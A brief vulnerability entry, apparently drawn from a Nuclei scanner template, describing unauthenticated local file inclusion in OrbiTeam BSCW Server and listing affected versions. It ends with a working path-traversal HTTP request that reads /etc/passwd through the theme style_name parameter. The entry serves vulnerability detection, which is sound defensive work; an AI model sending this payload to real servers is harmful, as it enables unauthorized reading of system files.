# Vulnerability: OrbiTeam BSCW Server - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`orbiteam-bscw-server-lfi.yaml`)

## Description
OrbiTeam BSCW Server versions 5.0.x, 5.1.x, 5.2.4 and below, 7.3.x and below, and 7.4.3 and below are vulnerable to unauthenticated local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd
```

